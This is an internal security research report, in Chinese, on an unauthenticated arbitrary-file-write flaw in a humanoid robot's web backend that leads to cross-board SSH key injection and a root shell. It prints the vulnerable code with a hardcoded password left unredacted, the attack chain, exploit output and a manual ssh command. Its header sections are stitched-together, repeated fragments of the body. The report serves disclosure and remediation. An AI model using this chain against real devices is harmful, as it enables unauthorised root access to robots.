---
编号: UBH-010
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选人型
源候选目录: api-sysupload任意路径写跨板SFTP-RCE-1
---
# UBH-010 t800-web-backend `/api/sysupload` 任意路径写（跨板 SFTP）→ RCE

## 1. 一句话结论

- # t800-web-backend `/api/sysupload` 任意路径写（跨板 SFTP）→ RCE
- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
- ## 1. 执行摘要
- **FastAPI :5000 `/api/sysupload`（multipart：`file`/`path`/`board_name`）未认证且参数全可控，
- 可将任意文件写到任意路径。当 `board_name=motion` 时，后端用硬编码凭证 `<密码_01>` 通过

## 2. 影响产品与版本

- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
- - 组件：`t800-web-backend` v0.2.9（:5000 FastAPI；容器 `walker-web.web-backend-1`）
- 2. 移除 `board_name=motion` 的硬编码 `<密码_01>` 跨板 SFTP 通道，改为受控服务/凭据；

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
- **FastAPI :5000 `/api/sysupload`（multipart：`file`/`path`/`board_name`）未认证且参数全可控，
- 严重度定级：**严重（Critical）**——未认证任意文件写 → RCE，且可跨板。
- ## 2. 漏洞根因（源码确认）
- - 入口：`POST /api/sysupload`，未认证
- **问题1（EISDIR）根因**：`sysupload` 先在容器本地写 `path/filename`，`os.makedirs(path)` 会把

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
- `sudo` → **root shell**（实测达成）。**
- 严重度定级：**严重（Critical）**——未认证任意文件写 → RCE，且可跨板。
- → ssh <访问令牌_01>.168.11.2（新注入公钥）→ sudo -n → root → SHELL ✅
- 注：**vision 板容器 `/root/.ssh` 为只读 bind-mount**（`/api/export` 能读、`sysupload` 写返回 500，
- ## 4. 受影响范围

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# t800-web-backend `/api/sysupload` 任意路径写（跨板 SFTP）→ RCE

> 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
> 复现已闭环（备份→注入→取 shell→恢复），设备无残留。证据见 `evidence/`。

---

## 1. 执行摘要

**FastAPI :5000 `/api/sysupload`（multipart：`file`/`path`/`board_name`）未认证且参数全可控，
可将任意文件写到任意路径。当 `board_name=motion` 时，后端用硬编码凭证 `<密码_01>` 通过
SFTP 把文件写到 motion 板（192.168.11.2）任意路径 → **跨板任意文件写**。
攻击者仅凭 HTTP API（零凭证）注入 SSH 公钥到 motion 板 `authorized_keys` → 免密 SSH →
`sudo` → **root shell**（实测达成）。**

严重度定级：**严重（Critical）**——未认证任意文件写 → RCE，且可跨板。

## 2. 漏洞根因（源码确认）

代码：`t800-web-backend` v0.2.9 容器内 `/app/controller/upload.py`（已通过 `/api/export` 穿越读出源码）。

```python
SSH_USERNAME = "walker"; SSH_PASSWORD = "aa"     # 硬编码跨板凭证
REMOTE_UPLOAD_DIR = "/tmp/upload"

@upload_router.post("/api/sysupload")
async def syupload(file, path=..., board_name="vision"):
    upload_dir = path
    os.makedirs(upload_dir, exist_ok=True)          # 容器本地先建 path 目录
    file_path = os.path.join(upload_dir, file.filename)   # 本地落点 = path/文件名
    with open(file_path, "wb") as buffer:            # ① 内容先写容器本地
        shutil.copyfileobj(file.file, buffer)
    target_ip = BOARD_IP_MAP.get(board_name)         # motion → 192.168.11.2
    if board_name != "vision":
        remote_path = os.path.join(path, file.filename)     # 远端落点 = path/文件名
        upload_file_to_remote(file_path, target_ip, remote_path)
        #   upload_file_to_remote: sftp.chdir(dirname(remote_path)); sftp.put(local, remote_path)

def upload_file_to_remote(file_path, remote_host, remote_path):
    ssh = paramiko.SSHClient(); ssh.connect(remote_host, username="walker", password="<密码_01>")
    sftp = ssh.open_sftp()
    remote_dir = os.path.dirname(remote_path)
    sftp.chdir(remote_dir)            # 目录不存在则 sftp.mkdir
    sftp.put(file_path, remote_path)
```

关键点：
- `path` 任意、`file.filename` 可控 → **SFTP 跨板落点 = `path + "/" + filename` 任意可控**；
- 后端始终**先在容器本地写 `path/filename`**（`os.makedirs(path)` 会把它建成目录），故容器本地
  不能有同名目录残留，否则本地 `open()` 报 `[Errno 21] Is a directory`（实测踩到，见 §5 问题1）；
- 权限：motion 板 `walker` 普通用户即可写 `/home/walker/.ssh/`（实测确认可写）。

## 3. 攻击链（零凭证，实测）

```
POST :5000/api/sysupload   board_name=motion  path=/home/walker/.ssh  filename=authorized_keys
  → 后端容器本地写 /home/walker/.ssh/authorized_keys
  → SFTP 用硬编码 <密码_01> 传到 motion 板 /home/walker/.ssh/authorized_keys（覆盖）
  → ssh <访问令牌_01>.168.11.2（新注入公钥）→ sudo -n → root → SHELL ✅
```

注：**vision 板容器 `/root/.ssh` 为只读 bind-mount**（`/api/export` 能读、`sysupload` 写返回 500，
实测），故 vision 侧 authorized_keys 注入不可行；跨板写 motion 是可用路径（motion `.ssh` 普通可写）。

## 4. 受影响范围

- 组件：`t800-web-backend` v0.2.9（:5000 FastAPI；容器 `walker-web.web-backend-1`）
- 入口：`POST /api/sysupload`，未认证
- 覆盖：vision 板容器任意路径 + motion 板（192.168.11.2）任意路径（跨板）

## 5. 复现（实机验证）

`python scripts/sysupload_rce.py --rce` 全流程（实测输出见 `evidence/rce_motion_shell_2026-08-29.txt`）：

```
[ 阶段 A ] 写 vision /tmp 探针 → export 读回一致 → 任意路径写成立 ✅
[1] 探针   board_name=motion 写 motion /tmp（自定义文件名）→ <密码_01> 读回一致 → SFTP 跨板写落地 ✅
[2] 备份   motion /home/walker/.ssh/authorized_keys 552B → evidence/backup_authorized_keys.motion
[3.0] 清理 rename-folder 把容器内残留同名目录移走（纯 HTTP，防本地 EISDIR）
[3] 注入   HTTP 200 落点 /home/walker/.ssh/authorized_keys
[4] SHELL  ssh（注入公钥）uid=1000(walker) → sudo -n id → uid=0(root) → hostname=motion  ✅
[5] 恢复   还原 552B，设备无残留
```

**问题1（EISDIR）根因**：`sysupload` 先在容器本地写 `path/filename`，`os.makedirs(path)` 会把
`path` 建成目录；历史实验若把 `/home/walker/.ssh/authorized_keys` 建成目录，本地 `open()` 即
EISDIR。解法：用 `/api/rename-folder`（`target_dir=/home/walker/.ssh, old_name=authorized_keys`）
纯 HTTP 移走残留目录（脚本 `[3.0]` 已内置）。新设备无残留时该步 404 忽略。

**手动 shell**：`ssh -i scripts/rce_tmp_key.pem <访问令牌_01>.168.11.2`

## 6. 修复建议

1. `/api/sysupload` 增加认证 + `path` 白名单（realpath 归一化，仅允许规定上传目录）；
2. 移除 `board_name=motion` 的硬编码 `<密码_01>` 跨板 SFTP 通道，改为受控服务/凭据；
3. `path` 校验拒绝 `..`、绝对路径；`filename` 清洗；
4. 与 `/api/export` 同源修复（同一无认证根因）。

## 7. 证据文件

| 文件 | 内容 |
|---|---|
| `evidence/rce_motion_shell_2026-08-29.txt` | **完整实机 RCE 输出**（探针→注入→shell→恢复） |
| `evidence/backup_authorized_keys.motion` | motion 板原 `authorized_keys` 备份（552B，恢复用） |
| `scripts/sysupload_rce.py` | 全链 PoC（`--rce` 注入取 shell，`--restore` 一键恢复） |
| `scripts/ssh_pass_probe.py` | 硬编码凭证 `<密码_01>` 双板登录探测（只读） |
| 后端源码（`/app/controller/upload.py`） | 根因确认：硬编码 SFTP 凭证 + `path/filename` 任意落点 |
